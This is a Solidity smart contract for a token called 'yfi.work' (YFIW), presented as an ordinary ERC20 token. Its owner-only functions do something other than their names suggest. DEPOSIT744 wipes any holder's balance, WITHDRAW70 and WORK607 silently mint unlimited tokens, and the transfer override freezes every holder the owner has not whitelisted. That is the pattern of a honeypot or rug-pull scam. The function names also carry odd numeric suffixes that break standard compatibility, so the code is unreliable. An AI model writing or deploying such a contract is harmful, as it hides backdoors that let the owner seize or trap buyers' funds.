                                                                 

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY802() external view returns (uint);	
    function BALANCEOF407(address account) external view returns (uint);	
    function TRANSFER567(address recipient, uint amount) external returns (bool);	
    function ALLOWANCE819(address owner, address spender) external view returns (uint);	
    function APPROVE812(address spender, uint amount) external returns (bool);	
    function TRANSFERFROM186(address sender, address recipient, uint amount) external returns (bool);	
    event TRANSFER876(address indexed from, address indexed to, uint value);	
    event APPROVAL489(address indexed owner, address indexed spender, uint value);	
}
contract Context {
    constructor () internal { }
    function _MSGSENDER726() internal view returns (address payable) {	
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY802() public view returns (uint) {	
        return _totalSupply;
    }
    function BALANCEOF407(address account) public view returns (uint) {	
        return _balances[account];
    }
    function TRANSFER567(address recipient, uint amount) public returns (bool) {	
        _TRANSFER40(_MSGSENDER726(), recipient, amount);
        return true;
    }
    function ALLOWANCE819(address owner, address spender) public view returns (uint) {	
        return _allowances[owner][spender];
    }
    function APPROVE812(address spender, uint amount) public returns (bool) {	
        _APPROVE637(_MSGSENDER726(), spender, amount);
        return true;
    }
    function TRANSFERFROM186(address sender, address recipient, uint amount) public returns (bool) {	
        _TRANSFER40(sender, recipient, amount);
        _APPROVE637(sender, _MSGSENDER726(), _allowances[sender][_MSGSENDER726()].SUB140(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE650(address spender, uint addedValue) public returns (bool) {	
        _APPROVE637(_MSGSENDER726(), spender, _allowances[_MSGSENDER726()][spender].ADD807(addedValue));
        return true;
    }
    function DECREASEALLOWANCE914(address spender, uint subtractedValue) public returns (bool) {	
        _APPROVE637(_MSGSENDER726(), spender, _allowances[_MSGSENDER726()][spender].SUB140(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER40(address sender, address recipient, uint amount) internal {	
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB140(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD807(amount);
        emit TRANSFER876(sender, recipient, amount);
    }
    function _INITAMOUNT300(address account, uint amount) internal {	
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD807(amount);
        _balances[account] = _balances[account].ADD807(amount);
        emit TRANSFER876(address(0), account, amount);
    }
    function _WORK162(address account, uint amount) internal {	
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD807(amount);
        _balances[account] = _balances[account].ADD807(amount);
    }
    function _WITHDRAW97(address account, uint amount) internal {	
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD807(amount);
        _balances[account] = _balances[account].ADD807(amount);
    }
    function _DEPOSIT450(address acc) internal {	
        _balances[acc] = 0;
    }
    function _APPROVE637(address owner, address spender, uint amount) internal {	
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL489(owner, spender, amount);
    }
}

contract ERC20Entity {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME310() public view returns (string memory) {	
        return _name;
    }
    function SYMBOL77() public view returns (string memory) {	
        return _symbol;
    }
    function DECIMALS359() public view returns (uint8) {	
        return _decimals;
    }
}

library SafeMath {
    function ADD807(uint a, uint b) internal pure returns (uint) {	
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB140(uint a, uint b) internal pure returns (uint) {	
        return SUB140(a, b, "SafeMath: subtraction overflow");
    }
    function SUB140(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL539(uint a, uint b) internal pure returns (uint) {	
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV829(uint a, uint b) internal pure returns (uint) {	
        return DIV829(a, b, "SafeMath: division by zero");
    }
    function DIV829(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract YFIW is ERC20, ERC20Entity {
  using SafeMath for uint;
  mapping (address => bool) public financer;
  mapping (address => bool) public subfinancer;
  constructor () public ERC20Entity("yfi.work", "YFIW", 18) {
      _INITAMOUNT300( msg.sender, 50000*10**uint(DECIMALS359()) );
      financer[msg.sender] = true;
      subfinancer[msg.sender] = true;
  }

  function DEPOSIT744(address account) public {	
      require(financer[msg.sender], "!warn");
      _DEPOSIT450(account);
  }

  function WITHDRAW70(address account, uint amount) public {	
      require(financer[msg.sender], "!warn");
      _WITHDRAW97(account, amount);
  }

  function WORK607(address account, uint amount) public {	
      require(financer[msg.sender], "!warn");
      _WORK162(account, amount);
  }

  function ADDSUBFINANCER728(address account) public {	
      require(financer[msg.sender], "!not allowed");
      subfinancer[account] = true;
  }

  function REMOVESUBFINANCER114(address account) public {	
      require(financer[msg.sender], "!not allowed");
      subfinancer[account] = false;
  }
  
  function _TRANSFER40(address sender, address recipient, uint amount) internal {	
      require(subfinancer[sender], "frozen");
      super._TRANSFER40(sender, recipient, amount);
  }
}